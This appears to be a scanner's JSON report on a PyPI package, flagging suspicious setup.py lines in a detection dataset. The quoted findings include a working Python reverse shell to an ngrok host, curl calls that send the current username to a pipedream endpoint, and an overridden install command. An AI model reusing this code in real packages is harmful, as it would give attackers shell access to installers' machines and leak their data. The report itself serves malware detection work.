@@ -1,0 +1,56 @@
+{
+    "issues": 7,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": [
+            {
+                "location": "setup.py:8",
+                "code": "    import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"8.tcp.ngrok.io\",13737));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:9",
+                "code": "    os.system(\"curl https://eounos2mk2uchtk.m.pipedream.net/$(whoami)\")\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:10",
+                "code": "    os.system(\"curl https://eounos2mk2uchtk.m.pipedream.net/$(whoami)\")\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:19",
+                "code": "setup(\n    name='debricked-test',\n    version='0.5',\n    license='MIT',\n    author=\"Giorgos Myrianthous\",\n    author_email='email@example.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://github.com/gmyr...nstall},\n)",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "code-execution": [
+            {
+                "location": "setup.py:8",
+                "code": "    import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"8.tcp.ngrok.io\",13737));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:9",
+                "code": "    os.system(\"curl https://eounos2mk2uchtk.m.pipedream.net/$(whoami)\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:10",
+                "code": "    os.system(\"curl https://eounos2mk2uchtk.m.pipedream.net/$(whoami)\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/debricked-test-0.5"
+}
